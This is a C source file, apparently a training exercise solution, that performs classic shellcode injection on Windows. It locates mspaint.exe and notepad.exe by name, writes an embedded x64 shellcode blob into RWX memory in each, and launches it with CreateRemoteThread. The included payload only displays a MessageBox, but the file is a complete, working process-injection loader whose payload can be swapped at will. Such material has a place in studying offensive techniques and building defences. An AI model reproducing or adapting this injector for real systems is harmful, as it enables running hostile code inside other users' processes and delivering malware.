/*
 * exercise 2 solution
 * classic shellcode injection - two separate thread injections
 * hack2.c
 * author: @cocomelonc
 *
 * change: instead of injecting into a single hard-coded PID, the code
 * uses findMyProc() to locate mspaint.exe and notepad.exe by name,
 * then performs a full injection into each one in turn.
 *
 * new helper: injectInto(procname)
 *   - resolves procname -> PID via CreateToolhelp32Snapshot
 *   - opens the process, allocates RWX memory, writes the payload,
 *     creates the remote thread, and waits for it to finish
 *
 * what to observe:
 *   start both mspaint.exe and notepad.exe before running this binary.
 *   two MessageBox dialogs should appear, one in each process.
 *
 * compile (cross-compile from Linux):
 * x86_64-w64-mingw32-gcc hack2.c -o hack2.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

// same MessageBox payload used in the original hack.c
unsigned char my_payload[] =
  "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
  "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
  "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
  "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
  "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
  "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
  "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
  "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
  "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
  "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
  "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
  "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
  "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
  "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
  "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
  "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
  "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
  "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
  "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
  "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
  "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
  "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
  "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
  "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
  "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
  "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
  "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
  "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
  "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

// resolve a process name to its PID using a system snapshot
int findMyProc(const char *procname) {
  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  pe.dwSize = sizeof(PROCESSENTRY32);
  hResult = Process32First(hSnapshot, &pe);
  while (hResult) {
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }
  CloseHandle(hSnapshot);
  return pid;
}

/*
 * exercise 2 change: new helper function.
 * encapsulates the full injection pipeline for a single target so it
 * can be called twice - once per target process.
 */
int injectInto(const char *procname) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  PVOID  rb; // remote buffer

  int pid = findMyProc(procname);
  if (pid == 0) {
    printf("[-] '%s' not found - is it running?\n", procname);
    return -1;
  }
  printf("[+] '%s' found, PID = %d\n", procname, pid);

  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
  if (ph == NULL) {
    printf("[-] OpenProcess failed: %lu\n", GetLastError());
    return -1;
  }

  rb = VirtualAllocEx(ph, NULL, sizeof(my_payload),
                      (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(ph, rb, my_payload, sizeof(my_payload), NULL);
  rt = CreateRemoteThread(ph, NULL, 0,
                          (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);

  // wait up to 5 s for the payload to complete (MessageBox needs a click)
  WaitForSingleObject(rt, 5000);
  CloseHandle(rt);
  CloseHandle(ph);
  printf("[+] injection into '%s' done\n", procname);
  return 0;
}

int main(void) {
  printf("[*] injecting into mspaint.exe ...\n");
  injectInto("mspaint.exe");

  printf("[*] injecting into notepad.exe ...\n");
  injectInto("notepad.exe");

  return 0;
}
